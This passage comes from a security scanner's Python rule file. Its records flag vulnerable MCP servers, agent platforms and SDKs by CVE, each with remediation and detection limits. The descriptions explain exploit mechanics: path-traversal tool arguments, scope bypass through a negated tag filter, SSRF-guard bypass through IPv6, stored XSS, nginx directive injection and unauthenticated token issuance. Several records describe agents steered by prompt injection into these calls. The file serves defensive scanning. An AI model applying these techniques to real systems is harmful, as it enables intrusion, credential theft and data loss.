    "(CVE-2026-105799, CVSS 4.0 2.3, CWE-943, GHSA-5x6v-p487-7qh2). 1.1.1 escapes "
    "every filter value (langchainjs#10701).",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Upgrade `@langchain/redis` to 1.1.1 or later and pin it. Until then, do not "
    "build a tenant or access boundary from a filter value a user controls, or "
    "enforce the boundary outside the vector search.",
    sarif_name="LangChainRedisFilterInjection",
    cve_references=["CVE-2026-105799"],
    owasp_agentic_references=["ASI04", "ASI06"],
    adversa_references=["ADV-SUPPLY-04"],
    limitations=(
        "Reports `@langchain/redis` below 1.1.1 where a package.json, lockfile or "
        "MCP config states the version, taking the lowest version a range allows. "
        "`latest` and other tags state no version and are not reported. It reads the "
        "version, not the filters, so a project whose filters never carry user input "
        "is reported without being exposed. The Python `langchain-redis` is a "
        "different package and is not read. A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)

_r(
    "AAK-MCP-LANGCHAIN-MONGO-CVE-2026-106119-001",
    "LangChain.js MongoDB chat history through 1.3.0: an object session id reaches another user's conversation",
    "`@langchain/mongodb`'s `MongoDBChatMessageHistory` keeps agent conversations "
    "in MongoDB, keyed by session id. Through 1.3.0 it put the session id into its "
    "`findOne`, `updateOne` and `deleteOne` filters as given, without enforcing "
    "the documented string type, so a structured id was read as a query condition. "
    "Where several users' histories share one collection, a caller who controls "
    "the id can read, change or delete another user's conversation "
    "(CVE-2026-106119, CVSS 4.0 6.0, CWE-943, GHSA-m6rx-h84q-8r95). An application "
    "that passes only authenticated, server-controlled string ids is not affected. "
    "1.3.1 rejects a non-string id and wraps it in `$eq` (langchainjs#11672).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@langchain/mongodb` to 1.3.1 or later and pin it. Until then, give "
    "`MongoDBChatMessageHistory` only a session id your server derives as a "
    "string, never one taken from a request.",
    sarif_name="LangChainMongoChatHistoryQueryInjection",
    cve_references=["CVE-2026-106119"],
    owasp_agentic_references=["ASI04", "ASI06"],
    adversa_references=["ADV-SUPPLY-04"],
    limitations=(
        "Reports `@langchain/mongodb` below 1.3.1 where a package.json, lockfile or "
        "MCP config states the version, taking the lowest version a range allows. "
        "`latest` and other tags state no version and are not reported. It reads the "
        "version, not where the session id comes from, so a project that passes only "
        "server-side string ids is reported without being exposed. The Python "
        "`langchain-mongodb` is a different package and is not read. A file over 2 "
        "MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-09 batch (#926-#930). One new image pin below, beside the CRITICAL
# Obot pin, and four out of scope. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-OBOT-CVE-2026-105138-001",
    "Obot image v0.12.0 to v0.26.1: a user granted a catalog entry can read its static secrets",
    "Obot (`ghcr.io/obot-platform/obot`) lets admins and power users set static "
    "configuration on an MCP catalog entry, such as the API key or token the server "
    "uses. From v0.12.0, when static configuration arrived, until v0.26.2, a basic "
    "user granted that entry by an access control rule could read those values in "
    "plaintext from `GET /api/all-mcps/entries/{entry_id}` and use them against the "
    "backend services (CVE-2026-105138, CVSS 3.1 6.5, CWE-522, "
    "GHSA-q5wf-87f5-cxgq). v0.26.2 stores static configuration in a credential and "
    "returns the manifest field marked static instead of its value (fix commit "
    "`644a1fd`).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade the Obot image to v0.26.2 or later and pin its tag. Then rotate the "
    "API keys and tokens set as static configuration on catalog entries that "
    "basic users could reach.",
    sarif_name="ObotCatalogEntryStaticSecretRead",
    cve_references=["CVE-2026-105138"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-TOKEN-09"],
    limitations=(
        "Reads the same image references as the other Obot pin and reports tags from "
        "v0.12.0 up to v0.26.2. A tag below v0.12.0 is not reported here, though the "
        "other Obot pin reports it. `latest` (or no tag) is not reported: it was "
        "v0.26.3 on 2026-10-09. A two-part tag such as `0.26` stands for the newest "
        "patch on that line and is not reported, because 0.26 has fixed releases. "
        "The enterprise image `ghcr.io/obot-platform/obot-enterprise` is a different "
        "image and is not matched."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-11 batch (#953-#959). Two npm pins and one image pin below, and four
# out of scope. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-ARGOCD-CVE-2026-108585-001",
    "argocd-mcp builds Argo CD API paths from tool arguments, so delete_application can reach repositories and clusters (no fixed release)",
    "`argocd-mcp` (npm; argoproj-labs/mcp-for-argocd), the Argo CD MCP server, puts "
    "the `applicationName` tool argument into Argo CD API paths unencoded, and its "
    "HTTP client resolves each path against the base URL with `new URL`, which "
    "collapses dot segments. So a `delete_application` call whose name is "
    "`../repositories/<repo>` sends an authenticated `DELETE` to "
    "`/api/v1/repositories/<repo>`, and the same reaches clusters and projects, "
    "within the API token's RBAC. An agent that reads untrusted text can be steered "
    "into that call (CVE-2026-108585, CVSS 3.1 5.4, CWE-22). Every published version "
    "builds the path this way (0.0.1, the first, through 0.9.0, the newest), there "
    "is no commit after 0.9.0, and there is no fixed release, so this is a "
    "presence-only pin.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Set `MCP_READ_ONLY=true`, which turns off the tools "
    "that change or delete resources, or give the server an Argo CD token whose RBAC "
    "has no delete permission on repositories, clusters or projects. Pin the first "
    "fixed release once it ships.",
    sarif_name="ArgoCdMcpDeleteApplicationPathTraversal",
    cve_references=["CVE-2026-108585"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-06"],
    limitations=(
        "Reports a reference that names `argocd-mcp`: a package.json or lockfile "
        "entry, or the package in an MCP config, such as the README's "
        "`npx argocd-mcp@latest stdio`. Presence-only: every version is reported, a "
        "future fixed one included, until the pin gets a floor, and `MCP_READ_ONLY` "
        "is not read. `argocd-mcp-server` and `mcp-argocd` are other projects and are "
        "not matched. The project's images (`ghcr.io/argoproj-labs/mcp-for-argocd`, "
        "`quay.io/argoprojlabs/mcp-for-argocd`) are not read. "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-1MCP-CVE-2026-108586-001",
    "1MCP Agent from 0.20.0: a negated tag filter reaches servers outside an OAuth token's tag scopes (no fixed release)",
    "`@1mcp/agent` (npm; 1mcp-app/agent) serves several MCP servers behind one "
    "endpoint and, with OAuth on, limits a token to the servers whose tags its "
    "`tag:<name>` scopes grant. 0.20.0 added the advanced `tag-filter` parameter, a "
    "boolean expression over tags, and the scope check validates only the tags the "
    "expression names. So a token granted one tag can send `not <granted-tag>`, "
    "which names only that tag, passes the check, and selects every other backend "
    "server, whose tools it can then list and call (CVE-2026-108586, CVSS 3.1 5.4, "
    "CWE-863). 0.19.0 has no `tag-filter`, and 0.39.0, the newest, still validates "
    "the tags extracted from the expression. There is no fixed release, so this pin "
    "reports every version from 0.20.0.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Until one ships, do not rely on tag scopes to keep "
    "backends apart: run one 1MCP instance per trust boundary. Pin the first fixed "
    "release once it ships.",
    sarif_name="OneMcpNegatedTagFilterScopeBypass",
    cve_references=["CVE-2026-108586"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports `@1mcp/agent` from 0.20.0 where a package.json, lockfile or MCP "
        "config states the version, and an unpinned reference such as "
        "`npx -y @1mcp/agent`, which resolves to an affected release. The bypass "
        "needs the HTTP transport with OAuth on; the pin reads versions, not how the "
        "agent is started, so a stdio-only setup is reported too. The unscoped npm "
        "`1mcp` is another project and is not matched, and the release binaries "
        "state no version AAK reads. "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-KORTIX-CVE-2026-108115-001",
    "Kortix API image 0.10.7 to 0.13.51: IPv6 6to4 and Teredo addresses get past the SSRF guard",
    "Kortix (kortix-ai/suna, the platform NVD calls Kortix Suna) is a self-hosted "
    "AI agent platform whose API server ships as the Docker Hub image "
    "`kortix/kortix-api`. A connector takes a base URL, an OpenAPI or Postman "
    "source, or an MCP server URL, and from 0.10.7, when "
    "`apps/api/src/shared/ssrf-guard.ts` arrived, an `isPrivateIp` check refused "
    "private destinations. It did not decode IPv6 6to4 (`2002::/16`) or Teredo "
    "(`2001::/32`) addresses, which carry an IPv4 address, so a user holding "
    "`project.connector.write` could point a connector at an internal service or a "
    "cloud metadata endpoint and read the response (CVE-2026-108115, CVSS 3.1 4.9, "
    "CWE-918). 0.13.52 reads the IPv4 address out of a 6to4 address and refuses "
    "Teredo (fix commit `9c949e4`, in v0.13.52 and not v0.13.51).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade the `kortix/kortix-api` image to 0.13.52 or later and pin its tag. "
    "Then check connector base URLs and MCP URLs for 6to4 (`2002:`) or Teredo "
    "(`2001:0:`) addresses set before the upgrade.",
    sarif_name="KortixConnectorSsrfGuardBypass",
    cve_references=["CVE-2026-108115"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `kortix/kortix-api` image references from 0.10.7 up to 0.13.52 in "
        "compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP "
        "configs. The bare Docker Hub name is matched, so "
        "`docker.io/kortix/kortix-api` is not read. A `kortix self-host` stack names "
        "the image `${API_IMAGE}` in its compose file and keeps the tag in its `.env`, "
        "which this reader does not read, so such an instance is reported only where "
        "a manifest states the tag. `latest` was 0.13.53 and `stable` 0.13.52 on "
        "2026-10-11, both fixed, so an untagged or channel reference is not reported. "
        "Commit-hash tags, such as every tag of `ghcr.io/kortix-ai/kortix-api`, state "
        "no version."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-13 batch (#963, #973-#977). Two image pins, one JVM pin and one npm
# pin below, and two out of scope. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-UNLA-CVE-2026-108865-001",
    "Unla gateway image through v0.10.0: the built-in OAuth2 server issues tokens without authenticating anyone (no fixed release)",
    "Unla (AmoyLab/Unla, formerly mcp-gateway) is a Go MCP gateway that ships as "
    "container images: `ghcr.io/amoylab/unla/allinone`, "
    "`ghcr.io/amoylab/unla/mcp-gateway`, and the Aliyun mirror "
    "`registry.ap-southeast-1.aliyuncs.com/amoylab/unla-allinone` its Chinese README "
    "names. Its built-in OAuth2 server never authenticates a resource owner: "
    "`/authorize` issues a code to any registered client without asking who the "
    "user is, and `/token` exchanges it. So an unauthenticated attacker can register "
    "a client, get a code and exchange it for a valid access token, which opens the "
    "OAuth2-protected MCP prefixes, the upstream APIs Unla proxies and the "
    "credentials it injects into them (CVE-2026-108865, CVSS 3.1 8.2, CWE-287). The "
    "OAuth2 server arrived in v0.6.0, the `amoylab/unla` images start at v0.7.0, and "
    "v0.10.0, the newest release, still issues codes this way. "
    "`internal/auth/oauth.go` has not changed since 2025-10-11, so there is no fixed "
    "release.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Put an authenticating reverse proxy in front of "
    "Unla's `/authorize`, `/token` and its OAuth2-protected MCP prefixes, and keep "
    "the gateway off untrusted networks. If an instance was reachable, rotate the "
    "upstream credentials it injects. Pin the first fixed release once it ships.",
    sarif_name="UnlaOAuthServerIssuesUnauthenticatedTokens",
    cve_references=["CVE-2026-108865"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads the three Unla image names in compose files, Kubernetes manifests, Helm "
        "values, Dockerfiles and MCP configs, up to and including v0.10.0, and "
        "`latest`, which was the v0.10.0 digest on 2026-10-13. The `main` tag and "
        "commit tags state no version and are not reported, and images from before "
        "the rename (`mcp-ecosystem/mcp-gateway`) are not read. The pin reads the image "
        "tag, not the gateway's configuration, so an instance with no "
        "OAuth2-protected MCP prefix is reported too."
    ),
)

_r(
    "AAK-MCP-KOTLINSDK-CVE-2026-108714-001",
    "MCP Kotlin SDK from 0.7.3: Application.mcpWebSocket accepts WebSocket frames of any size (no fixed release)",
    "The MCP Kotlin SDK server module (`io.modelcontextprotocol:kotlin-sdk-server`, "
    "which the `kotlin-sdk` umbrella pulls in) has an `Application.mcpWebSocket` "
    "extension that installs Ktor's `WebSockets` plugin with no `maxFrameSize`, so "
    "Ktor's default of `Long.MAX_VALUE` applies. A remote client can send small frame "
    "headers that declare payloads near 2 GiB, over one or a few connections, and "
    "force the server to allocate them until the JVM runs out of heap "
    "(CVE-2026-108714, CVSS 3.1 7.5, CWE-770). Checked in the source and on Maven "
    "Central: the extension is absent at 0.7.2, arrives in 0.7.3 and is unchanged "
    "through 0.15.0, the newest release, and nothing on `main` sets a frame limit, "
    "so there is no fixed release.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Do not use `Application.mcpWebSocket`: install "
    "`WebSockets` yourself with a `maxFrameSize` sized to your largest legitimate "
    "message, and register the endpoint with `Route.mcpWebSocket`, which does not "
    "install the plugin. Or keep the WebSocket transport off untrusted networks. "
    "Pin the first fixed release once it ships.",
    sarif_name="McpKotlinSdkWebSocketUnboundedFrame",
    cve_references=["CVE-2026-108714"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04", "ASI08"],
    adversa_references=["ADV-DOS-01"],
    limitations=(
        "Dependency-level detection on JVM manifests only: `build.gradle`, "
        "`build.gradle.kts`, `gradle/libs.versions.toml` and `pom.xml`. Reports "
        "`kotlin-sdk-server`, `kotlin-sdk` and their `-jvm` variants from 0.7.3 where "
        "a version resolves, and not `kotlin-sdk-core` or `kotlin-sdk-client`, which "
        "do not carry the extension. Every version from 0.7.3 is reported, a future "
        "fixed one included, until the pin gets a floor. It reads versions, not code, "
        "so a server that uses only stdio or SSE, or installs `WebSockets` with its "
        "own `maxFrameSize`, is reported too. A dynamic version or a `version.ref` to "
        "a catalog outside the scanned tree is not reported."
    ),
)

_r(
    "AAK-MCP-ELVIX-CVE-2026-108542-001",
    "@elvix.is/sdk MCP server below 0.10.2: a tool's path argument can send the elvix API key to any host",
    "`@elvix.is/sdk` (npm; 021is/elvix-sdk) is a sign-in SDK that also ships an MCP "
    "server (`elvix mcp`, `elvix-mcp`), whose tools call the elvix API with the "
    "configured `ELVIX_API_KEY` as a Bearer token. From 0.1.0 to 0.10.1 the shared "
    "tool handler builds the request URL as "
    "`new URL(args.path ?? tool._meta.path, baseUrl)`, so an absolute URL in the "
    "caller-supplied `path` replaces the base URL, and the server sends the request, "
    "API key included, to a loopback, internal, cloud-metadata or attacker host "
    "(CVE-2026-108542, CVSS 3.1 6.3, CWE-918). Checked in the npm tarballs: 0.1.0 "
    "and 0.10.1 build the URL this way, and 0.10.2 (`ed0c622`, 2026-08-30) binds "
    "every tool to its manifest path, refuses a URL outside the configured origin "
    "and does not follow redirects. npm marks 0.0.0 to 0.10.1 deprecated with a "
    "security notice; 0.0.0 is an empty placeholder with no MCP server.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@elvix.is/sdk` to 0.10.2 or later and pin it. Then rotate any elvix "
    "API key that was used with the MCP server, as the package's deprecation notice "
    "asks.",
    sarif_name="ElvixSdkMcpPathSsrfLeaksApiKey",
    cve_references=["CVE-2026-108542"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reports `@elvix.is/sdk` from 0.1.0 below 0.10.2 in a package.json, lockfile "
        "or MCP config, and an unpinned reference such as `bunx @elvix.is/sdk mcp`, "
        "which this scanner reads as exposed. The pin reads the version, not whether "
        "the MCP server runs, so an app that uses the SDK only for sign-in is "
        "reported too. `elvix`, `elvix-sdk` and `@021is/elvix-sdk` are not npm "
        "packages and are not matched. "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-TRINITY-CVE-2026-108756-001",
    "Trinity backend image through 0.9.5: an agent's MCP key can replace or delete its owner's Telegram binding (no fixed release)",
    "Trinity (Abilityai/trinity) is a self-hosted agent platform whose backend "
    "ships as `ghcr.io/abilityai/trinity-backend`. An agent-scoped MCP API key "
    "resolves to the agent's owner, and the Telegram router's binding routes "
    "(`configure_telegram_bot` and `delete_telegram_binding` in "
    "`src/backend/routers/telegram.py`) check only that the caller owns the agent, "
    "with no `reject_agent_principal`. So an agent, typically steered by prompt "
    "injection, can perform what are meant to be human-only binding operations: in "
    "NVD's words, \"send messages through the owner's bot token, replace the binding "
    "with their own token, or delete it\" (CVE-2026-108756, CVSS 3.1 5.4, CWE-862). "
    "The images start at 0.9.5-rc1, 0.9.5 is the newest release, and the 1.0.0 "
    "release candidates still serve those routes without the check, so there is no "
    "fixed release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Until one ships, treat every agent on an instance "
    "with a Telegram binding as able to change that binding: remove the binding from "
    "agents that do not need it, and check the bound bot after any agent run that "
    "read untrusted content. Pin the first fixed release once it ships.",
    sarif_name="TrinityTelegramBindingAgentKeyBypass",
    cve_references=["CVE-2026-108756"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `ghcr.io/abilityai/trinity-backend` references up to and including "
        "0.9.5, and `latest`, which was the 0.9.5 digest on 2026-10-13, in compose "
        "files, Kubernetes manifests, Helm values, Dockerfiles and MCP configs. "
        "Trinity's own compose files build the backend from source or name it with "
        "`${TRINITY_IMAGE_TAG:-latest}`, which states no version this reader trusts, "
        "so such an instance is reported only where a manifest states the tag. The "
        "1.0.0 release candidates read as 1.0.0 and are not reported, although they "
        "still lack the check, and the two-part `0.9` tag floats and is not reported."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-15 batch (#982-#986), with the same-floor records the watcher had not
# filed yet. Both rules carry every CVE their one fix release closes.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-OBSIDIANTC-CVE-2026-77366-001",
    "obsidian-tc below 1.3.1: any HTTP token reaches every configured vault, the HTTP transport answers cross-origin requests, and the read ACL leaks",
    "obsidian-tc is an MCP server for Obsidian vaults, published on npm as "
    "`obsidian-tc` and as the image `ghcr.io/the-40-thieves/obsidian-tc`. Every "
    "release below 1.3.1 (1.0.1, 1.0.2 and 1.2.1) carries five disclosed defects "
    "that one upgrade fixes. CVE-2026-77366 (CRITICAL 9.9): tool dispatch never "
    "compares a call's `vault` argument with the caller's vault, the JWT has no vault "
    "claim and the folder ACL is global, so any valid HTTP token reads, writes or "
    "deletes every configured vault. CVE-2026-77363 (HIGH 8.8): the Streamable HTTP "
    "transport checks neither Host nor Origin, so with the documented loopback setup "
    "and `auth.mode: \"none\"` a web page drives the endpoint as the all-scopes "
    "`http-local` caller. CVE-2026-77364 (MEDIUM 6.5): an undefined `readPaths` or "
    "`writePaths` allows every path, and `.obsidian`, `.git` and `.trash` are hidden "
    "only from listings, so a caller reads plugin API keys and Sync passwords from "
    "`.obsidian/plugins/*/data.json` by path. CVE-2026-77361 (MEDIUM 4.7): read-ACL "
    "checks use the lexical path, so an in-vault symlink under an allowed folder "
    "reads a denied one. CVE-2026-77362 (MEDIUM 4.3): the `tasks_filter`, "
    "`makemd_query` and `list_templates` bridge tools return data from notes outside "
    "the caller's read ACL. The first two need the HTTP transport, which is off by "
    "default.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `obsidian-tc` (npm or the GHCR image) to 1.3.1 or later and pin it. "
    "Until then keep the HTTP transport off, or require JWT auth and run one vault "
    "per server process; set explicit `readPaths` and `writePaths` that leave out "
    "`.obsidian`, `.git` and `.trash`; and allow no untrusted symlinks in the vault. "
    "After upgrading, give each tenant's token a `vault` claim.",
    sarif_name="ObsidianTcVaultBindingAndOriginBypass",
    cve_references=[
        "CVE-2026-77366",
        "CVE-2026-77363",
        # Fixed in the same release and filed after the two above, so recorded
        # here before the watcher opened issues for them: GHSA-cvp8-vvgf-69q4,
        # GHSA-c5xx-h28h-f682 and GHSA-43r2-c7g8-prc8 all give `< 1.3.1`.
        "CVE-2026-77364",
        "CVE-2026-77361",
        "CVE-2026-77362",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports `obsidian-tc` below 1.3.1, from 1.0.0 on, where a package.json, "
        "lockfile or MCP config states the version, reporting a range that admits an "
        "affected version, and `ghcr.io/the-40-thieves/obsidian-tc` tags below 1.3.1 "
        "in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP "
        "configs. An unpinned `npx -y obsidian-tc`, the README's own config, installs "
        "1.33.1, the newest release on 2026-10-15, so it is not reported, and neither "
        "is the image's `latest`. The 0.0.1 placeholder and the scoped "
        "`@the-40-thieves/obsidian-tc` placeholder have no server and are not "
        "reported. The pin reads the version, not the transport setting, so a "
        "stdio-only install is reported too. The Claude Desktop bundle (`.mcpb`) and "
        "the Obsidian plugin are not read. "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-NGINXUI-CVE-2026-84317-001",
    "Nginx UI image 2.0.1 to 2.4.0: MCP config tools write blocked nginx directives and skip the secure-session step-up (code execution where njs or Perl is loaded)",
    "Nginx UI is a web UI for nginx with a built-in MCP server (`/mcp` and "
    "`/mcp_message`), deployed from the Docker Hub image `uozi/nginx-ui`. Its MCP "
    "tools first ship in 2.0.0-rc.6. Through 2.4.0 the `nginx_config_add` tool writes "
    "the caller's content to disk and reloads nginx without `ValidateConfigFile`, "
    "the check the REST API and `nginx_config_modify` apply from 2.3.9, so an "
    "authenticated MCP caller, or an agent steered by prompt injection, can write "
    "`js_*`, `perl*`, `load_module` or `user root` directives. Where the njs or Perl "
    "module is loaded, as in the official image, that runs code in the nginx "
    "worker. CVE-2026-84317 and CVE-2026-84318 (both CVSS 8.8) report this defect "
    "twice, and CVE-2026-84319 (CVSS 8.3) a third time, for a secondary user. The "
    "MCP routes also skip the `RequireSecureSession` step-up the REST configuration "
    "routes require, so an OTP-enabled user without a secure session can still "
    "change the configuration (CVE-2026-84360, CVSS 8.1). 2.4.1 (`23d1934`) "
    "validates the content and requires the secure session for the sensitive MCP "
    "tools.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade the `uozi/nginx-ui` image to 2.4.1 or later and pin the tag. Until "
    "then, give MCP access only to trusted principals, do not load the njs or Perl "
    "modules, and check configuration written through MCP for `js_*`, `perl*`, "
    "`load_module` and `user root` directives.",
    sarif_name="NginxUiMcpConfigDirectiveInjection",
    cve_references=[
        "CVE-2026-84317",
        "CVE-2026-84318",
        # Recorded before the watcher filed them. GHSA-5r62-gj48-897x is a third
        # report of the add-tool bypass; GHSA-vc32-4gwf-77xp gives `<= 2.4.0`, and
        # `RequireSecureSession` guards the REST config routes from 2.0.0-rc.6,
        # the release the MCP tools arrived in, so its range is the same.
        "CVE-2026-84319",
        "CVE-2026-84360",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-05", "ADV-AUTH-01"],
    limitations=(
        "Reads `uozi/nginx-ui` references from 2.0.1 below 2.4.1 in compose files, "
        "Kubernetes manifests, Helm values, Dockerfiles and MCP configs. The README's "
        "compose file and `docker run` use `latest`, which was the v2.8.4 digest on "
        "2026-10-15, so they are not reported, and the `docker.io/` form is not read. "
        "2.0.0 and its betas and release candidates all read as 2.0.0, and the MCP "
        "tools arrived in 2.0.0-rc.6, so the reader cannot tell an affected 2.0.0 tag "
        "from an older one: none of them is reported, although 2.0.0-rc.6 to 2.0.0 "
        "are affected. The release binaries and the install script state no image "
        "tag and are not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-15 second batch (#995-#999). Two image pins, one npm pin and one JVM
# pin, the first on the MCP Java SDK.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-EDGEEVER-CVE-2026-109557-001",
    "EdgeEver image below 1.113.0: notebook names, memo titles and templates written through MCP run as script (stored XSS)",
    "EdgeEver is a self-hosted knowledge base with a built-in MCP server. Its image, "
    "`ghcr.io/tianma-if/edgeever`, serves the API, the MCP tools and the web UI. "
    "Through 1.112.0 the web UI writes a dragged memo's label into `innerHTML` in "
    "`setMemoDragPreview`, so a notebook name or memo title set through the MCP "
    "`create_notebook`, `rename_notebook` or `create_memo` tools runs as script when "
    "the user drags it (CVE-2026-109557, CVSS 3.1 8.7, CWE-79). `TemplatesPane` "
    "renders a template's Markdown through `marked` into `dangerouslySetInnerHTML` "
    "with no sanitizer, so a template written with an API or MCP token runs script "
    "on preview (CVE-2026-109558, CVSS 3.1 8.7, CWE-79). In the desktop app that "
    "script can reach the privileged `window.edgeeverDesktop` bridge and its session "
    "token. An agent steered by prompt injection can plant either payload. Checked "
    "in the source: both sinks and the three MCP tools are in 1.33.0, the oldest "
    "image tag, and in 1.112.0, and 1.113.0 (`6b5027e8`) sets the drag label with "
    "`textContent` and passes template HTML through DOMPurify.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade the `ghcr.io/tianma-if/edgeever` image to 1.113.0 or later and pin the "
    "tag, and update the desktop app, which renders the same views. Until then, give "
    "MCP and API tokens only to trusted agents, and check notebook names, memo "
    "titles and templates for HTML.",
    sarif_name="EdgeEverMcpStoredXss",
    cve_references=["CVE-2026-109557", "CVE-2026-109558"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-05"],
    limitations=(
        "Reads `ghcr.io/tianma-if/edgeever` references below 1.113.0 in compose files, "
        "Kubernetes manifests, Helm values, Dockerfiles and MCP configs. The project's "
        "own compose file takes the tag from `${EDGE_EVER_VERSION:-latest}`, and its "
        "Docker guide sets that variable in the shell (`export "
        "EDGE_EVER_VERSION=vX.Y.Z`), which no file states, so a deployment that "
        "follows the guide is not reported. Its one-command installer pulls `latest` "
        "and updates it daily, and `latest` was the 1.120.0 digest on 2026-10-15, so "
        "an untagged reference is not reported either. The desktop app and the "
        "Cloudflare deployment state no image tag and are not read."
    ),
)

_r(
    "AAK-MCP-NULLHUB-CVE-2026-110616-001",
    "NullHub image through v2026.5.29: the /api management routes accept requests with no authentication (no fixed release)",
    "NullHub is the management console for the nullclaw agent ecosystem. Its `/api` "
    "routes install and configure agent instances, their provider credentials, cron "
    "jobs and MCP servers. It ships as release binaries and as the image "
    "`ghcr.io/nullclaw/nullhub`, whose default command serves on `0.0.0.0`. The "
    "server checks a bearer token only when `auth_token` is set, and nothing sets "
    "it: the field defaults to null and the settings API reports it as null. A "
    "client that reaches a non-loopback listener without an `Origin` header can "
    "therefore control the agent instances, rewrite their configuration and "
    "credentials, and manage their cron jobs and MCP servers (CVE-2026-110616, CVSS "
    "3.1 8.1, CWE-306). Checked in the source: `auth_token` is never assigned at "
    "v2026.3.2, the oldest image tag, at v2026.5.29, the newest release, or on "
    "`main`, so there is no fixed release.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Run NullHub on loopback (`serve --host 127.0.0.1`) "
    "and reach it through an SSH tunnel or a reverse proxy that authenticates, and "
    "keep the container port off untrusted networks. Pin the first fixed release "
    "once it ships.",
    sarif_name="NullHubManagementApiNoAuth",
    cve_references=["CVE-2026-110616"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `ghcr.io/nullclaw/nullhub` references up to and including v2026.5.29 "
        "in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP "
        "configs. `latest` was the v2026.5.29 digest on 2026-10-15, so an untagged or "
        "`latest` reference is reported too; once a fixed image takes `latest`, that "
        "arm reports a patched deployment until the pin moves. A release after "
        "v2026.5.29 is outside the record's range and is not reported, which is not a "
        "claim that it is fixed. It reads the tag, not the command, so a container "
        "started with `--host 127.0.0.1` is reported as well. The release binaries "
        "state no version in a file this reader opens and are not read."
    ),
)

_r(
    "AAK-MCP-JUNIE-CVE-2026-111091-001",
    "JetBrains Junie CLI before 26.8.3 (npm build below 2548.5.0): an untrusted project's MCP server configuration runs code",
    "Junie CLI is JetBrains' coding agent for the terminal, published on npm as "
    "`@jetbrains/junie` and earlier as `@jetbrains/junie-cli`. It reads MCP servers "
    "from the project's `.junie/mcp/mcp.json` as well as from the user's own "
    "configuration. Before 26.8.3, an untrusted project's MCP server configuration "
    "could run code on the machine of a user who started Junie in it "
    "(CVE-2026-111091, CVSS 3.1 7.8, CWE-829). The npm package is a launcher that "
    "installs the Junie build named in its `junieVersion` field, and its version is "
    "that build number: 26.8.3 is build 2548.5, published to npm as 2548.5.0 on "
    "2026-08-03. Checked in the builds: 888.112, the oldest `@jetbrains/junie` "
    "release, and 2470.4, the last npm release before the fix, read the project's "
    "`.junie/mcp/mcp.json`, and 2548.5 adds a trust prompt that previews the "
    "project's MCP servers.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
